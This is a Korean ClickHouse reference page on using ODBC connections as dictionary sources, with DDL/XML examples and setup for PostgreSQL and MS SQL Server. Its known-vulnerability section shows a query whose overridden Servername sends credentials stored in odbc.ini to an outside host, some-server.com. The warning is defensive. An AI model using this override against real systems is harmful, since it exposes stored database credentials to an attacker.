---
slug: /sql-reference/statements/create/dictionary/sources/odbc
title: 'ODBC 딕셔너리 소스'
sidebar_position: 6
sidebar_label: 'ODBC'
description: 'ClickHouse에서 ODBC 연결을 딕셔너리 소스로 설정합니다.'
doc_type: 'reference'
---

import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';

이 메서드를 사용하면 ODBC 드라이버를 지원하는 모든 데이터베이스에 연결할 수 있습니다.

설정 예시:

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    SOURCE(ODBC(
        db 'DatabaseName'
        table 'SchemaName.TableName'
        connection_string 'DSN=some_parameters'
        invalidate_query 'SQL_QUERY'
        query 'SELECT id, value_1, value_2 FROM db_name.table_name'
    ))
    ```
  </TabItem>

  <TabItem value="xml" label="설정 파일">
    ```xml
    <source>
        <odbc>
            <db>DatabaseName</db>
            <table>ShemaName.TableName</table>
            <connection_string>DSN=some_parameters</connection_string>
            <invalidate_query>SQL_QUERY</invalidate_query>
            <query>SELECT id, value_1, value_2 FROM ShemaName.TableName</query>
        </odbc>
    </source>
    ```
  </TabItem>
</Tabs>

<br />

설정 필드:

| Setting                | Description                                                                                                    |
| ---------------------- | -------------------------------------------------------------------------------------------------------------- |
| `db`                   | 데이터베이스 이름입니다. 데이터베이스 이름이 `<connection_string>` 매개변수에 설정되어 있으면 생략하십시오.                                          |
| `table`                | 테이블 이름입니다. 스키마가 있으면 스키마 이름도 함께 지정합니다.                                                                          |
| `connection_string`    | 연결 문자열입니다.                                                                                                     |
| `invalidate_query`     | 딕셔너리 상태를 확인하는 쿼리입니다. 선택 사항입니다. 자세한 내용은 [Refreshing dictionary data using LIFETIME](../lifetime.md) 섹션을 참조하십시오. |
| `background_reconnect` | 연결에 실패하면 백그라운드에서 레플리카에 다시 연결합니다. 선택 사항입니다.                                                                     |
| `query`                | 사용자 지정 쿼리입니다. 선택 사항입니다.                                                                                        |

:::note
`table` 필드와 `query` 필드는 함께 사용할 수 없습니다. 또한 `table` 또는 `query` 필드 중 하나는 반드시 선언해야 합니다.
:::

ClickHouse는 ODBC 드라이버에서 받은 인용 부호를 사용해 드라이버로 보내는 쿼리의 모든 설정 값을 인용하므로, 테이블 이름은 데이터베이스에 저장된 대소문자와 정확히 일치하도록 설정해야 합니다.

Oracle 사용 시 인코딩 문제가 발생하면 관련 [FAQ](/ko/knowledgebase/oracle-odbc) 항목을 참조하십시오.

<div id="known-vulnerability-of-the-odbc-dictionary-functionality">
  ### ODBC 딕셔너리 기능의 알려진 취약점
</div>

:::note
ODBC 드라이버의 connection 매개변수 `Servername`를 통해 데이터베이스에 연결할 때, 해당 값이 치환될 수 있습니다. 이 경우 `odbc.ini`에 있는 `USERNAME` 및 `PASSWORD` 값이 원격 server로 전송되어 노출될 수 있습니다.
:::

**안전하지 않은 사용 예시**

PostgreSQL용 unixODBC를 구성해 보겠습니다. `/etc/odbc.ini`의 내용은 다음과 같습니다.

```text
[gregtest]
Driver = /usr/lib/psqlodbca.so
Servername = localhost
PORT = 5432
DATABASE = test_db
#OPTION = 3
USERNAME = test
PASSWORD = test
```

그런 다음 다음과 같이 쿼리하면

```sql
SELECT * FROM odbc('DSN=gregtest;Servername=some-server.com', 'test_db');
```

ODBC 드라이버는 `odbc.ini`에 있는 `USERNAME` 및 `PASSWORD` 값을 `some-server.com`으로 전송합니다.

<div id="example-of-connecting-postgresql">
  ### PostgreSQL 연결 예시
</div>

Ubuntu OS.

unixODBC 및 PostgreSQL용 ODBC 드라이버를 설치합니다:

```bash
$ sudo apt-get install -y unixodbc odbcinst odbc-postgresql
```

`/etc/odbc.ini` 설정(또는 ClickHouse를 실행하는 사용자로 로그인한 경우 `~/.odbc.ini`):

```text
    [DEFAULT]
    Driver = myconnection

    [myconnection]
    Description         = PostgreSQL connection to my_db
    Driver              = PostgreSQL Unicode
    Database            = my_db
    Servername          = 127.0.0.1
    UserName            = username
    Password            = password
    Port                = 5432
    Protocol            = 9.3
    ReadOnly            = No
    RowVersioning       = No
    ShowSystemTables    = No
    ConnSettings        =
```

ClickHouse의 딕셔너리 구성은 다음과 같습니다:

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    CREATE DICTIONARY table_name (
        id UInt64,
        some_column UInt64 DEFAULT 0
    )
    PRIMARY KEY id
    SOURCE(ODBC(connection_string 'DSN=myconnection' table 'postgresql_table'))
    LAYOUT(HASHED())
    LIFETIME(MIN 300 MAX 360)
    ```
  </TabItem>

  <TabItem value="xml" label="설정 파일">
    ```xml
    <clickhouse>
        <dictionary>
            <name>table_name</name>
            <source>
                <odbc>
                    <!-- connection_string에 다음 매개변수를 지정할 수 있습니다: -->
                    <!-- DSN=myconnection;UID=username;PWD=password;HOST=127.0.0.1;PORT=5432;DATABASE=my_db -->
                    <connection_string>DSN=myconnection</connection_string>
                    <table>postgresql_table</table>
                </odbc>
            </source>
            <lifetime>
                <min>300</min>
                <max>360</max>
            </lifetime>
            <layout>
                <hashed/>
            </layout>
            <structure>
                <id>
                    <name>id</name>
                </id>
                <attribute>
                    <name>some_column</name>
                    <type>UInt64</type>
                    <null_value>0</null_value>
                </attribute>
            </structure>
        </dictionary>
    </clickhouse>
    ```
  </TabItem>
</Tabs>

<br />

드라이버 `DRIVER=/usr/local/lib/psqlodbcw.so`를 사용해 라이브러리의 전체 경로를 지정하려면 `odbc.ini`를 수정해야 할 수 있습니다.

<div id="example-of-connecting-ms-sql-server">
  ### MS SQL Server 연결 예시
</div>

Ubuntu 운영체제.

MS SQL Server에 연결하기 위한 ODBC 드라이버 설치:

```bash
$ sudo apt-get install tdsodbc freetds-bin sqsh
```

드라이버 구성:

```bash
    $ cat /etc/freetds/freetds.conf
    ...

    [MSSQL]
    host = 192.168.56.101
    port = 1433
    tds version = 7.0
    client charset = UTF-8

    # test TDS connection
    $ sqsh -S MSSQL -D database -U user -P password


    $ cat /etc/odbcinst.ini

    [FreeTDS]
    Description     = FreeTDS
    Driver          = /usr/lib/x86_64-linux-gnu/odbc/libtdsodbc.so
    Setup           = /usr/lib/x86_64-linux-gnu/odbc/libtdsS.so
    FileUsage       = 1
    UsageCount      = 5

    $ cat /etc/odbc.ini
    # $ cat ~/.odbc.ini # if you signed in under a user that runs ClickHouse

    [MSSQL]
    Description     = FreeTDS
    Driver          = FreeTDS
    Servername      = MSSQL
    Database        = test
    UID             = test
    PWD             = test
    Port            = 1433


    # (optional) test ODBC connection (to use isql-tool install the [unixodbc](https://packages.debian.org/sid/unixodbc)-package)
    $ isql -v MSSQL "user" "password"
```

참고:

* 특정 SQL Server 버전에서 지원되는 가장 낮은 TDS 버전을 확인하려면 제품 설명서를 참조하거나 [MS-TDS Product Behavior](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/135d0ebe-5c4c-4a94-99bf-1811eccb9f4a)를 확인하십시오.

ClickHouse에서 딕셔너리 구성:

<Tabs>
  <TabItem value="ddl" label="DDL" default>
    ```sql
    CREATE DICTIONARY test (
        k UInt64,
        s String DEFAULT ''
    )
    PRIMARY KEY k
    SOURCE(ODBC(table 'dict' connection_string 'DSN=MSSQL;UID=test;PWD=test'))
    LAYOUT(FLAT())
    LIFETIME(MIN 300 MAX 360)
    ```
  </TabItem>

  <TabItem value="xml" label="설정 파일">
    ```xml
    <clickhouse>
        <dictionary>
            <name>test</name>
            <source>
                <odbc>
                    <table>dict</table>
                    <connection_string>DSN=MSSQL;UID=test;PWD=test</connection_string>
                </odbc>
            </source>

            <lifetime>
                <min>300</min>
                <max>360</max>
            </lifetime>

            <layout>
                <flat />
            </layout>

            <structure>
                <id>
                    <name>k</name>
                </id>
                <attribute>
                    <name>s</name>
                    <type>String</type>
                    <null_value></null_value>
                </attribute>
            </structure>
        </dictionary>
    </clickhouse>
    ```
  </TabItem>
</Tabs>